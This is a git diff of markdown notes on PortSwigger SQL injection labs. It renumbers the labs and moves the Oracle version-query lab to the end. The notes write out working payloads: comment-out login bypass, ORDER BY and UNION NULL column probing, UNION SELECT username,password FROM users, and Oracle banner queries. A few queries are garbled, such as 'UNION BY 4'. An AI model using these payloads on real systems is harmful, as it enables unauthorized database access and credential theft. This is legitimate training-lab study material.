@@ -20,20 +20,7 @@
 ### Injections:
 - `'admin'--'` - Commenting out the remaining portion of the original query.
 
-## Lab 3: SQL injection attack, querying the database type and version on Oracle `Union Query`
-- On Oracle databases, every SELECT statement must specify a table to select FROM.
-- If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.
-- There is a `built-in table on Oracle called 'dual'` For example: `UNION SELECT 'abc' FROM dual`
-
-- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
-- Modified: `SELECT * FROM products WHERE category = 'Gifts' UNION SELECT 'abc','def' FROM dual--`
-- Query to executed by DB after injections: `SELECT * FROM products WHERE category = 'Gifts'' UNION SELECT 'abc','def' FROM dual--`
-- To get the Oracle Version: `SELECT * FROM products WHERE category = 'Gifts'union+SELECT+banner,NULL+FROM+v$version--`
-
-### Injections:
-- `'union+SELECT+banner,NULL+FROM+v$version--` - Concate the second query with Union clause in Original Query.
-
-## Lab 4: SQL injection UNION attack, determining the number of columns returned by the query
+## Lab 3: SQL injection UNION attack, determining the number of columns returned by the query
 1. ' ORDER BY 1-- injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs.
 - Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
 - Modified: `SELECT * FROM products WHERE category = 'Gifts' UNION BY 4--`
@@ -46,7 +33,7 @@
 - Query to executed by DB after injections: `It should throw a Server side Error 500`
 
 
-## Lab 5: SQL injection UNION attack, finding a column containing text
+## Lab 4: SQL injection UNION attack, finding a column containing text
 - First, Determine the number of columns returned by the query.
 - Second, Determine a column that is compatible with string data. 
 
@@ -56,7 +43,7 @@
 - Modified: `SELECT * FROM products WHERE category = 'Gifts'+UNION+SELECT+NULL,NULL,'a'--` (Server Error, means this column accepting text value)
 - Modified: `SELECT * FROM products WHERE category = 'Gifts'+UNION+SELECT+NULL,'a',NULL--` ('a' determine that the 2nd column accepting text value)
 
-## Lab 6: SQL injection UNION attack, `retrieving data from other tables` [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables#)
+## Lab 5: SQL injection UNION attack, `retrieving data from other tables` [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables#)
 
 - Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
 - Modified: `SELECT * FROM products WHERE category = 'Gifts'UNION+SELECT+username,password+FROM+users--` This should return all the users available in USERS table. (Since, table and columns name were given in Lab description. We can take it from there)
@@ -64,7 +51,7 @@
 - ![image](https://github.com/user-attachments/assets/003e7533-e7c9-401d-824d-fe7c7a34fe98)
 
 
-## Lab 7: SQL injection UNION attack, retrieving multiple values in a single column [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-multiple-values-within-a-single-column/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
+## Lab 6: SQL injection UNION attack, retrieving multiple values in a single column [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-multiple-values-within-a-single-column/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
 
 - Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
 - Modified:
@@ -79,6 +66,15 @@
 - Login with Admin Creds to Solve the LAb
 - ![image](https://github.com/user-attachments/assets/d73f2473-adfa-4ba2-beac-dfc914e9e354)
 
+## Lab 7: SQL injection attack, querying the database type and version on Oracle `Union Query` [Link]()
+- On Oracle databases, every SELECT statement must specify a table to select FROM.
+- If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.
+- There is a `built-in table on Oracle called 'dual'` For example: `UNION SELECT 'abc' FROM dual`
 
-## Lab 8: [Link]()
+- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
+- Modified: `SELECT * FROM products WHERE category = 'Gifts' UNION SELECT 'abc','def' FROM dual--`
+- Query to executed by DB after injections: `SELECT * FROM products WHERE category = 'Gifts'' UNION SELECT 'abc','def' FROM dual--`
+- To get the Oracle Version: `SELECT * FROM products WHERE category = 'Gifts'union+SELECT+banner,NULL+FROM+v$version--`
 
+### Injections:
+- `'union+SELECT+banner,NULL+FROM+v$version--` - Concate the second query with Union clause in Original Query.
